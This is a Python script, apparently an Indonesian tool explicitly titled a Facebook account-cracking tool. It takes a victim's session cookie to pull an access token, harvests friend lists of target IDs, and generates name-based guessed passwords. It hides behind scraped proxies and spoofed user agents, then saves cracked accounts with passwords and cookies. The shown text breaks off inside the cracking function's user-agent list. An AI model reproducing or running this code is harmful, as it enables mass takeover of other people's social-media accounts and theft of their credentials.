#!/usr/bin/python3
# -- coding: utf-8 --

import requests,bs4,json,os,sys,random,datetime,time,re,urllib3
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from platform import platform
# INDICATION
id=[]
id2=[]
loop=0
ok=0
cp=0
akun=[]
oprek=[]
method=[]
taplikasi=[]
tokenku=[]
uid=[]
lisensikuni=[]
cokbrut=[]
pwpluss=[]
pwnya=[]
princp=[]
ugen=[]
ugen2=[]
pwlist=[]
lisensiku=['sukses']
ses=requests.Session()
x = '\33[m' # DEFAULT
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
# COLORS
CY='\x1b[1;96m' #CYAN
H='\033[1;32m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
U='\x1b[1;97m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
C='\033[0m' #CLEAR
# Converter Bulan
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
tpc = 'TAP-YES-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
try:
    prox= requests.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print('GAGAL MENGAMBIL DATA PROXY')
    exit()
prox=open('.prox.txt','r').read().splitlines()
#os.system('rm -rf .prox.txt')
for jiah in range(1000):
 aa='Mozilla/5.0 (Windows NT 6.3;'
 b=random.choice(['6','7','8','9','10','11','12'])
 c='Nokia'
 d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
 e=random.randrange(100, 9999)
 f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
# g='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0'
 g='/Trident/7.0; Touch; rv:11.0) like Gecko',
 h=random.randrange(73,100)
 i='0'
 j=random.randrange(4200,4900)
 k=random.randrange(40,150)
 l='Touch; rv:11.0'
 uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
# uaku2=f'{aa} {b}; {c}{e}) {g}{h}.{i}.{j}.{k} {l}'
 ugen.append(uaku2)
for bb in range(10000):
    a='Mozilla/5.0 (Linux; Android 6.0.1;'
    b=random.randrange(4000, 9999)
    c='Nexus 5X Build/MMB29P)'
    d=random.choice(['0','1','2','3','4','5','6'])
    e=random.randrange(1,6)
    f=random.randrange(100, 999)
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
    h='2'
    i=random.choice(['0','1'])
    j=random.randrange(4200,4900)
    k=random.randrange(100,999)
    l='Mobile Safari/537.36'
    ua=f'{a}{b}/{c}.{d}.{e}.{f} {g}{h}.{i} {j} {k}{l}'
    ugen2.append(ua)
def cocok():
    try:
        cokbru=open('.cookie.txt').read()
        cokbrut.append(cokbru)
    except:
        login_lagi334()
def clear():
    os.system('clear')
def back():
    login()
def banner():
    clear()
    welcome=f'''{CY}────────────────────────────────────────────────────────────{C}
>>>>>>>>>>{U}SELAMAT DATANG DI ALAT CRACK FACEBOOK{C}<<<<<<<<<<<<<              
{CY}────────────────────────────────────────────────────────────'''
    print(welcome)
    ban=f'''
           {U} ____    ____  ___  ____   ______  {C} 
           {U}|_   \  /   _||_  ||_  _|.' ____ \  {C}
             {CY}|   \/   |    | |_/ /  | (___ \_| {C}
             {CY}| |\  /| |    |  __'.   _.____`.  {C}
           {U} _| |_\/_| |_  _| |  \ \_| \____) | {C}
           {U}|_____||_____||____||____|\______.' {C}
                                    
{CY}────────────────────────────────────────────────────────────'''
    print(ban)
def login():
    if 'sukses' in lisensiku:
        cocok()
        try:
            token = open('.token.txt','r').read()
            tokenku.append(token)
            try:
                sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]})
                sy2 = json.loads(sy.text)['name']
                sy3 = json.loads(sy.text)['id']
                menu(sy2,sy3)
            except KeyError:
                login_lagi334()
            except requests.exceptions.ConnectionError:
                banner()
                welcome=f'''
{M}jaringanmu jelek sayang,ulangi lagi{C}      
{CY}────────────────────────────────────────────────────────────'''
                print(welcome)
                exit()
        except IOError:
            login_lagi334()
    else:lisensi()
def login_lagi334():
    banner()
    pil='1'
    if pil in ['1','01']:
        try:
            welcome=f'''
{U}LOGIN MENGGUNAKAN COOKIE{C}                 
{CY}────────────────────────────────────────────────────────────'''
            print(welcome)
            cooki=input("Cookie : ")
            open('.cookie.txt','w').write(cooki)
            head = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
            data = requests.get("https://business.facebook.com/business_locations", headers =head, cookies = {"cookie":cooki}) 
            find_token = re.search("(EAAG\w+)", data.text)
            ken=open(".token.txt", "w").write(find_token.group(1))
            cokrom=open('.cookie.txt','r').read()
            tokrom=open('.token.txt','r').read()
            tes = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokrom,cookies={'cookie': cokrom})
            tes3 = json.loads(tes.text)['id']
            welcome=f'''
{H}LOGIN SUKSESS, JALANKAN ULANG PERINTAH..{C}                 
{CY}────────────────────────────────────────────────────────────'''
            print(welcome)
            exit()
        except Exception as e: 
            os.system("rm -rf .token.txt")
            os.system("rm -rf .cookie.txt")
            wwelcome=f'''
{K}COOKIE KEDALUWARSA ATAU AKUN TERKUNCI/RUSAK{C}            
{CY}────────────────────────────────────────────────────────────'''
            print(welcome)
            exit()
def tlisensi():
    banner()
    welcome=f'''╭────────────────────────────────────────────────────────────╮
│             {K}LICENSE IS NOT APPLICABLE OR WRONG{C}             │
╰────────────────────────────────────────────────────────────╯'''
    print(welcome)
    time.sleep(2)
    lisen=input('[•] Enter License : ')
    open('.lisen.txt','w').write(lisen)
    lisensi()

def lisensi():
    try:
        cek=open('.lisen.txt').read()
        lisensikuni.append(cek)
    except:
        tlisensi()
    ress = requests.get("https://fbkey.aorec.xyz/check.php?fbkey&key=%s&dev=%s"%(lisensikuni[0],platform())).json()
    berber=ress['usage']
    if berber=='premium':
        if ress['status'] == 'berlaku':
            lisensiku.append("sukses")
            banner()
            welcome=f'''╭────────────────────────────────────────────────────────────╮
│                    {H}LICENSE APPLICABLE{C}                      │
╰────────────────────────────────────────────────────────────╯'''
            print(welcome)
            time.sleep(2)
            lisensiku.append("sukses")
    else:
        tlisensi()
def menu(my_name,my_id):
    try:sh = requests.get('https://httpbin.org/ip').json()
    except:sh = {'origin':'-'}
    banner()
    print('')
    print(f'{CY}(•){U}SELAMAT DATANG  {CY}: {U}'+str(my_name))
    print(f'{CY}(•){U}ID KAMU         {CY}: {U}'+str(my_id))
    print(f'{CY}(•){U}IP KAMU         {CY}: {U}'+str(sh['origin'])+C)
    welcome=f'''{CY}────────────────────────────────────────────────────────────'''
    print(welcome)
    io = f'''*{U}PILIH MENU CRACK {M}!!!{C}\n{CY}────────────────────────────────────────────────────────────{C}
{CY}(01){U} CRACK PUBLIK{C}  {CY}(04){U} PERIKSA CP OPTI0N{C} 
{CY}(02){U} CRACK MASSAL{C}  {CY}(05){U} PERIKSA HASIL CRACK{C}   
{CY}(03){U} TIPS CRACK{C}    {CY}(00){M} KELUAR  {C}
{CY}────────────────────────────────────────────────────────────'''
    print(io)
    ec = input('Pilih : ')
    if ec in ['1','01']:
        dump_publik()
    elif ec in ['2','02']:
        dump_massal()
    elif ec in ['3','03']:
        tipsx()
    elif ec in ['4','04']:
        file()
    elif ec in ['5','05']:
        result()
    elif ec in ['0','00']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print('[•] WAIT • • •')
        time.sleep(1)
        welcome=f'''
{H}SUKSES KELUAR{C}                         
{CY}────────────────────────────────────────────────────────────'''
        print(welcome)
        exit()
    else:
        welcome=f'''
{M}PILIHAN TDAK AD DI MENU{C}                    
{CY}────────────────────────────────────────────────────────────'''
        print(welcome)
        exit()


def result():
    welcome=f'''
{U}PERIKSA HASIL CRACK {C}                    
{CY}────────────────────────────────────────────────────────────'''
    print(welcome)
    welcome=f'''
{CY}(01){U} PERIKSA HASIL CP {C}
{CY}(02){U} PERIKSA HASIL OK {C}   
{CY}────────────────────────────────────────────────────────────'''
    print(welcome)
    kz = input('[f] Pilih : ')
    if kz in ['1','01']:
        try:vin = os.listdir('CP')
        except FileNotFoundError:
            welcome=f'''
{M}PENYIMPANAN TIDAK AD{C}
{CY}────────────────────────────────────────────────────────────'''
            print((welcome))
            time.sleep(2)
            back()
        if len(vin)==0:
            welcome=f'''
{M}ANDA TIDAK MEMILIKI HASIL CP{C}
{CY}────────────────────────────────────────────────────────────'''
            print((welcome))
            time.sleep(2)
            back()
        else:
            welcome=f'''
{U}HASIL CP ANDA{C}
{CY}────────────────────────────────────────────────────────────'''
            print((welcome))
            cih = 0
            lol = {}
            for isi in vin:
                try:hem = open('CP/'+isi,'r').readlines()
                except:continue
                cih+=1
                if cih<10:
                    nom = '0'+str(cih)
                    lol.update({str(cih):str(isi)})
                    lol.update({nom:str(isi)})
                    print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+U)
            else:
                lol.update({str(cih):str(isi)})
                print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+U)
            welcome=f'''
{U}PILIH HASIL{C}
{CY}────────────────────────────────────────────────────────────'''
            print((welcome))
            geeh = input('[f] Pilih : ')
            try:geh = lol[geeh]
            except KeyError:
                welcome=f'''
{M}PILIHAN TIDAK ADA DI MENU{C}
{CY}────────────────────────────────────────────────────────────'''
                print(welcome)
                exit()
            try:lin = open('CP/'+geh,'r').read().splitlines()
            except:
                welcome=f'''
{M}FILE TIDAK DITEMUKAN, PERIKSA DAN COBA LAGI{C}
{CY}────────────────────────────────────────────────────────────'''
                print(welcome)
                time.sleep(2)
                back()
            welcome=f'''
{U}HASIL AKUN CP KAMU{C}
{CY}────────────────────────────────────────────────────────────'''
            print(welcome)
            nocp=0
            for cpku in range(len(lin)):
                cpkuni=lin[nocp].split('|')
                cpkuh=f'{K}(•) ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
                print(cpkuh)
                nocp +=1
            welcome=f'''
{U}HASIL AKUN CP KAMU{C}
{CY}────────────────────────────────────────────────────────────'''
            print(welcome)
            welcome=f'''
{H}TEKAN ENTER UNTUK KEMBALI{C}
{CY}────────────────────────────────────────────────────────────'''
            print(welcome)
            input('')
            back()
    elif kz in ['2','02']:
        try:vin = os.listdir('OK')
        except FileNotFoundError:
            welcome=f'''
{M}PENYIMPANAN TIDAK ADA{C}
{CY}────────────────────────────────────────────────────────────'''
            print((welcome))
            time.sleep(2)
            back()
        if len(vin)==0:
            welcome=f'''
{M}KAMU TIDAK PUNYA HASIL OK{C}
{CY}────────────────────────────────────────────────────────────'''
            print((welcome))
            time.sleep(2)
            back()
        else:
            welcome=f'''
{U}HASIL OK KAMU{C}
{CY}────────────────────────────────────────────────────────────'''
            print((welcome))
            cih = 0
            lol = {}
            for isi in vin:
                try:hem = open('OK/'+isi,'r').readlines()
                except:continue
                cih+=1
                if cih<10:
                    nom = '0'+str(cih)
                    lol.update({str(cih):str(isi)})
                    lol.update({nom:str(isi)})
                    print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+U)
            else:
                lol.update({str(cih):str(isi)})
                print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+U)
            welcome=f'''
{U}PILIH HASIL{C}
{CY}────────────────────────────────────────────────────────────'''
            print((welcome))
            geeh = input('[f] Pilih : ')
            try:geh = lol[geeh]
            except KeyError:
                welcome=f'''
{M}PILIHAN TIDAK ADA DI MENU{C}
{CY}────────────────────────────────────────────────────────────'''
                print(welcome)
                exit()
            try:lin = open('OK/'+geh,'r').read().splitlines()
            except:
                welcome=f'''
{M}FILE TIDAK DITEMUKAN, PERIKSA DAN COBA LAGI{C}
{CY}────────────────────────────────────────────────────────────'''
                print(welcome)
                time.sleep(2)
                back()
            welcome=f'''
{U}HASIL AKUN OK KAMU{C}
{CY}────────────────────────────────────────────────────────────'''
            print(welcome)
            nocp=0
            for cpku in range(len(lin)):
                cpkuni=lin[nocp].split('|')
                cpkuh=f'{H}(•) ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
                print(cpkuh)
                print(f'COOKIE : {cpkuni[2]}')
                nocp +=1
            welcome=f'''
{U}HASIL AKUN OK KAMU{C}
{CY}────────────────────────────────────────────────────────────'''
            print(welcome)
            welcome=f'''
{H}TEKAN ENTER UNTUK KEMBALI{C}
{CY}────────────────────────────────────────────────────────────'''
            print(welcome)
            input('')
            back()
    else:
        welcome=f'''
{M}PILIHAN TIDAK ADA DI MENU{C}
{CY}────────────────────────────────────────────────────────────'''
        print(welcome)
        exit()


def file():
    welcome=f'''
{U}PERIKSA CEKPOIN DARI FILE{C}
{CY}────────────────────────────────────────────────────────────'''
    print(welcome)
    print('(•) MEMBACA FILE, TUNGGU AJA ..')
    time.sleep(2)
    welcome=f'''
{U}PILIH FILE UNTUK DI PERIKSA{C}
{CY}────────────────────────────────────────────────────────────'''
    print(welcome)
    my_files = []
    try:
        lis = os.listdir('CP')
        for kt in lis:
            my_files.append(kt)
    except:pass
    if len(my_files)==0:
        welcome=f'''
{M}KAMU TIDAK MEMILIKI HASIL UNTUK DIPERIKSA{C}
{CY}────────────────────────────────────────────────────────────'''
        print(welcome)
        exit()
    else:
        cih = 0
        lol = {}
        for isi in my_files:
            try:hem = open('CP/'+isi,'r').readlines()
            except:
                try:hem = open('OK/'+isi,'r').readlines()
                except:continue
            cih+=1
            if cih<10:
                nom = '0'+str(cih)
                lol.update({str(cih):str(isi)})
                lol.update({nom:str(isi)})
                print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+U)
            else:
                lol.update({str(cih):str(isi)})
                print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+U)
        welcome=f'''
{U}PILIH FILE UNTUK DIPERIKSA{C}
{CY}────────────────────────────────────────────────────────────'''
        print(welcome)
        geeh = input('[f] Pilih : ')
        try:geh = lol[geeh]
        except KeyError:
            welcome=f'''
{M}PILIHAN TIDAK ADA DI MENU{C}
{CY}────────────────────────────────────────────────────────────'''
            print(welcome)
            exit()
        try:
            hf = open('CP/'+geh,'r').readlines()
            for fz in hf:
                akun.append(fz.replace('\n',''))
            cek_opsi()
        except IOError:
            try:
                hf = open('OK/'+geh,'r').readlines()
                for fz in hf:
                    akun.append(fz.replace('\n',''))
                cek_opsi()
            except IOError:
                welcome=f'''
{M}FILE TIDAK DITEMUKAN, PERIKSA DAN COBA KEMBALI{C}
{CY}────────────────────────────────────────────────────────────'''
                print(welcome)
                time.sleep(2)
                back()
def dump_publik():
    try:
        token = open('.token.txt','r').read()
    except IOError:
        exit()
    welcome=f'''{CY}────────────────────────────────────────────────────────────{C}
{CY}*{U}DUMP PUBLIC ID{C}                        
{CY}────────────────────────────────────────────────────────────'''
    print(welcome)
    pil = input('(f) MASUKKAN ID TARGET : ')
    dumpdump(pil)
    print('(•) TOTAL : '+str(len(id)))
    setting()

def dumpdump(pil):
    try:
        head = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
        koh2 = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]},headers=head).json()
        for pi in koh2['friends']['data']:
            try:
                iso=(pi['id']+'|'+pi['name'])
                if iso in id:pass
                else:id.append(iso)
            except:pass
    except requests.exceptions.ConnectionError:
        welcome=f'''
{M}JARINGANMU JELEK,ULANGI LAGI{C}
{CY}────────────────────────────────────────────────────────────'''
        print(welcome)
        input('')
    except (KeyError,IOError):
        pass

def dump_massal():
    welcome=f'''{CY}────────────────────────────────────────────────────────────{C}                                  
{CY}(01){U} CRACK MASSAL MANUAL{C}                                      
{CY}────────────────────────────────────────────────────────────'''
    print(welcome)
    pilih=input('(•) Pilih : ')
    if pilih in ['1','01']:
        print(U+'['+CY+'•'+U+'] BATAS TOTAL ID [20]')
        try:
            jum = int(input(U+'['+CY+'f'+U+'] Number Of Id : '))
        except ValueError:
            welcome=f'''
{M}INPUT YANG ANDA MASUKKAN BUKAN ANGKA{C}
{CY}────────────────────────────────────────────────────────────'''
            print(welcome)
            exit()
        if jum<1 or jum>20:
            welcome=f'''
{M}DILUAR JANGKAUAN{C}
{CY}────────────────────────────────────────────────────────────'''
            print(welcome)
            exit()
        yz = 0
        for met in range(jum):
            yz+=1
            kl = input(U+'['+CY+str(yz)+U+'] Enter The '+str(yz)+'Id : ')
            uid.append(kl)
    welcome=f'''
{CY}*{U}SEDANG MENGUMPULKAN ID{C}
{CY}────────────────────────────────────────────────────────────'''
    print(welcome)
    for userr in uid:
        dumpdump(userr)
    tot =f'{H}(•) SUKSES MENGAMBIL  %s ID'%(len(id))
    print(tot)
    setting()

def setting():
    welcome=f'''{CY}────────────────────────────────────────────────────────────\n*{U}SILAHKAN PILIH URUTAN ID {M}!!!{C}\n{CY}────────────────────────────────────────────────────────────{C}
{CY}(01) {U}CRACK ID TERTUA{C}
{CY}(02) {U}CRACK ID TERMUDA{C}
{CY}(03) {U}CRACK ID TERACAK{C} 
{CY}────────────────────────────────────────────────────────────'''
    print(welcome)
    hu = input(x+'['+p+'f'+x+'] Pilih : ')
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)

    elif hu in ['2','02']:
        muda=[]
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        welcome=f'''
{M}PILIHAN TIDAK ADA DI MENU{C}
{CY}────────────────────────────────────────────────────────────'''
        print(welcome)
        exit()
    welcome=f'''{CY}────────────────────────────────────────────────────────────{C}
{CY}*{U}PILIH METODE CRACK{C}                      
{CY}────────────────────────────────────────────────────────────'''
    print(welcome)
    welcome=f'''{CY}(01){U} METODE MOBILE{C}                                       
{CY}(02){U} METODE MBASIC{C}                                       
{CY}────────────────────────────────────────────────────────────'''
    print(welcome)
    hc = input(x+'['+p+'f'+x+']  : ')
    if hc in ['1','01']:
        method.append('mobile')
    elif hc in ['2','02']:
        method.append('mbasic')
    else:
        method.append('mobile')
    welcome=f'''{CY}────────────────────────────────────────────────────────────{C}
{CY}*{U}APAKAH INGIN MENAMPILKAN INFO AKUN ?{C}    
{CY}────────────────────────────────────────────────────────────'''
    print(welcome)
    aplik = input(x+'['+p+'f'+x+'] Pilih : ')
    if aplik in ['y','Y']:
        taplikasi.append('ya')
    else:
        taplikasi.append('no')
    welcome=f'''{CY}────────────────────────────────────────────────────────────{C}
{CY}*{U}APAKAH INGIN MENAMPILKAN OPSI CEKPOINT ?{C}
{CY}────────────────────────────────────────────────────────────'''
    print(welcome)
    osk = input(x+'['+p+'f'+x+'] Pilih : ')
    if osk in ['y','Y']:
        oprek.append('ya')
    else:
        oprek.append('no')
    welcome=f'''{CY}────────────────────────────────────────────────────────────{C}
{CY}*{U}SILAHKAN PILIH METODE SANDI {M}!!!{C}
{CY}────────────────────────────────────────────────────────────
{CY}(1){U} nama otomatis+digit pass{C}                                        
{CY}(2){U} hanya nama depan+angka{C}                               
{CY}────────────────────────────────────────────────────────────'''
    print(welcome)
    pwlis=input(x+'['+p+'f'+x+'] Pilih : ')
    pwlist.append(pwlis)


    welcome=f'''{CY}────────────────────────────────────────────────────────────{C}
{CY}*{U}INGIN MASUKAN SANDI TAMBAHAN ?{C}
{CY}────────────────────────────────────────────────────────────'''
    print(welcome)
    pwplus=input(x+''+p+''+x+'[y/t]: ')
    welcome=f'''{CY}────────────────────────────────────────────────────────────'''
    print(welcome)  
    if pwplus in ['y','Y']:
        pwpluss.append('ya')
        pwku=input('SANDI : ')
        pwkuh=pwku.split(',')
        for xpw in pwkuh:
            pwnya.append(xpw)
    else:
        pwpluss.append('no')
    passwrd()
#BAGIAN WORDLIST
def passwrd():
	krek = f'{U}HASIL {H}OK{U} : MAN-DATA/{H}OK/%{okc}\n{U}HASIL {K}CP{U} : MAN-DATA/{K}CP/{cpc}\n'
	print(krek)
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			if 'mobile' in method:
				pool.submit(crack,idf,pwv,nmf)
			elif 'mbasic' in method:
				pool.submit(crack,idf,pwv,nmf)
			else:
				pool.submit(crack,idf,pwv,nmf)
	print('')
	welcome=f'''{CY}────────────────────────────────────────────────────────────{C}
{CY}CRACK SELESAI,{H} JALANKAN PERINTAH ULANG..{C}
{CY}────────────────────────────────────────────────────────────'''
	print(welcome)
	exit()
# CRACKER
def crack(idf,pwv,nmf):
    if 'sukses' in lisensiku:
        pass
    else:
        welcome=f'''{M}╭────────────────────────────────────────────────────────────╮
│                       FUCK BYPASSER                      │
╰────────────────────────────────────────────────────────────╯{C}'''
        print(welcome)
        exit()
    global loop,ok,cp
    bi = random.choice([CY])
    pers = loop*100/len(id2)
    fff = '%'
    ua2 = random.choice(['Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
  'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko',
  'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko',
  'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko',
  'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36',
  'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36',
  'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER',
  'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36',
  'Mozilla/5.0 (Windows NT 6.0; rv:38.0) Gecko/20100101 Firefox/38.0',
  'Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36',
  'Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0',
  'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36',
  'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36',
  'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36',
  'Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0',
  'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0',
			'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
			'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)',
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
			'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36',
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
			'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
			'Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134','Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36',
 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
 'Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0 Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 625) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537',
 'Mozilla/5.0 (Linux; Android 10; Infinix X687 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36[FBAN/FB4A;FBAV/222.0.0.48.113;]',
 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
 'NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)',
 'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G977N/KSU4CTG1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36'
   'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko',
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36',
